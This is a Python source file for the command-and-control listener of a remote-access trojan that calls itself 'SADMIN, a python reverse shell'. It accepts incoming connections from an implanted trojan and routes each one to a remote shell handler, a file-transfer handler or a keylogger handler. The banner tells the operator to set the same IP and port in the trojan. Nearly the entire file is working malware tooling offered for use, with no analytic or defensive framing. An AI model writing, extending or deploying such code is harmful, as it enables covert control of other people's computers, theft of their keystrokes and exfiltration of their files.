import socket
import sys
import os
import upload
import handler
import keyhandler

def usage():
 a="""
 ____    _    ____  __  __ ___ _   _ 
/ ___|  / \  |  _ \|  \/  |_ _| \ | |
\___ \ / _ \ | | | | |\/| || ||  \| |
 ___) / ___ \| |_| | |  | || || |\  |
|____/_/   \_\____/|_|  |_|___|_| \_|

A python reverse shell.
Author: $TALK4R.
Version: 1.6

Usage: sadmin [server-ip] [server-port]

Enter the correct ip and port in the trojan and here for the connection.
"""
 print(a)


def main():
 
 try:
	if(len(sys.argv)!=3):
	 usage()
	 exit(0)
	
	ip=sys.argv[1]
	port=int(sys.argv[2])

	server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	server.bind((ip,port))
	server.listen(5)
	print("Waiting for connections...")

 	while(1):
		
		cli,addr=server.accept()
		print("%s:%d is connected\n" %(addr[0],addr[1]))
		type_of_client=cli.recv(1)
			 
		if(type_of_client=="S"):
		 print "SHELL IS CONNECTED"
		 handler.handle_shell(cli)
		 continue
			 
		elif(type_of_client=="U"):
		 print "FETCHER IS CONNECTED"
		 upload.handle_upload(cli)
		 continue

		elif(type_of_client=="K"):
		 print "KEYHANDLER IS CONNECTED"
		 keyhandler.handle_keypresser(cli)
		 continue
			 
		else:
		 cli.close()
		 server.close()
	 
 
 except KeyboardInterrupt:
	server.close()
	cli.close()
	print("Exiting")
	exit(0)



if __name__=="__main__":
 main()
